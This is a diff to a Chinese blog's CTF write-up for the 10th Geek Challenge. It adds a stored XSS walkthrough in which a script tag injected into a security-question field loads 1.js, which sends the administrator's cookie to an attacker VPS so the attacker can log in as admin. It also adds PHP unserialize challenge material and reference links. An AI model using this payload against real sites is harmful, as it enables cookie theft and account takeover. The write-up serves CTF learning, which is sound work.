@@ -555,6 +555,22 @@
 <p>菜刀 连上</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191030234008757.png" alt="image-20191030234008757"></p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191030234111964.png" alt="image-20191030234111964"></p>
+<h2 id="Leixiao’s-blog-你会盗号吗？？"><a href="#Leixiao’s-blog-你会盗号吗？？" class="headerlink" title="Leixiao’s blog:  你会盗号吗？？"></a>Leixiao’s blog:  你会盗号吗？？</h2><p>这道题是直接根据wp复现的，对XSS没有实战过，所以没写出来。</p>
+<p>XSS离不开输入框，所以BP抓包，修改各个参数的值，发现密保问题是可控的。所以就构造一个Script的语句，插入到数据库中，之后在重置密码页面，这个Script语句会插入到页面中。如果管理员访问了这个页面，那么我们就能得到管理员的cookie，从而以管理员身份登录。</p>
+<p>先注册一个用户，并将密保问题修改成Script语句 <code>&quot;&gt;&lt;script src=//0x12345678/1.js&gt;</code></p>
+<p>1.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.location=<span class="string">'http://vps_ip/cookie'</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191117232732259.png" alt="image-20191117232732259"></p>
+<p>我们访问dcz123用户的重置密码页面</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191117233119467.png" alt="image-20191117233119467"></p>
+<p>发现成功跳转了</p>
+<p>接下来把</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://148.70.59.198:41258/forget.php?username=dcz123</span><br></pre></td></tr></table></figure>
+
+<p>发给report</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191117233239962.png" alt="image-20191117233239962"></p>
+<p>管理员访问后，就能在访问日志中得到管理员的cookie了</p>
 <h2 id="反序列化1-0-socre10000拿到flag"><a href="#反序列化1-0-socre10000拿到flag" class="headerlink" title="反序列化1.0 : socre10000拿到flag"></a>反序列化1.0 : socre10000拿到flag</h2><p>F12查看源码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct working"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;score==<span class="number">10000</span>) &#123;</span><br><span class="line">            $flag = <span class="string">"******************"</span>;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = $_GET[<span class="string">'exp'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($exp);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -627,6 +643,8 @@
 <p>利用<code>phar://</code>协议触发序列化</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191114132652219.png" alt="image-20191114132652219"></p>
 <p>解码得到flag</p>
+<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">参考文章1</a></p>
+<p><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">参考文章2</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
